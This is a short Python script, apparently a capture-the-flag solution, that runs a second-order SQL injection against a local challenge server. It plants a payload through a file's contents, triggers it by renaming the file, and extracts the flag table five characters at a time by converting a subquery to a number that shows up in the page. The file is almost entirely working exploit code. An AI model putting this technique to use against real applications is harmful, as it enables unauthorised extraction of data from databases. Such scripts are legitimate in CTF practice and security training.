import requests
import re

if  __name__ == "__main__":
    URL = "http://localhost:1337/"
    exfil_regex = r'>\d+</textarea>'
    s = requests.Session() # need session to persist the files
    flag = ''
    for i in range(1, 30, 5):
        try:
            query = f"1'*CONV(HEX((SELECT MID((SELECT flag FROM flag), {i}, 5))), 16, 10));-- -"
            print(query)
            # create new file
            create_res = s.post(URL, data={'filename':'lolz.txt', 'contents':query})
            # get id from response url
            id = create_res.url.split('?id=')[1]
            # update filename to trigger the sql injection
            update_res = s.post(URL, data={'id':id, 'filename':f'lolz.txt.{i}', 'contents':query})
            # find exfil in response
            exfil = re.findall(exfil_regex, update_res.text)[0].replace('>','').replace('</textarea','')
            # convert int to hex then hex to ascii 
            flag += bytes.fromhex(hex(int(exfil))[2:]).decode('utf-8')
        except:
            break
    print(f"Got flag: {flag}")
        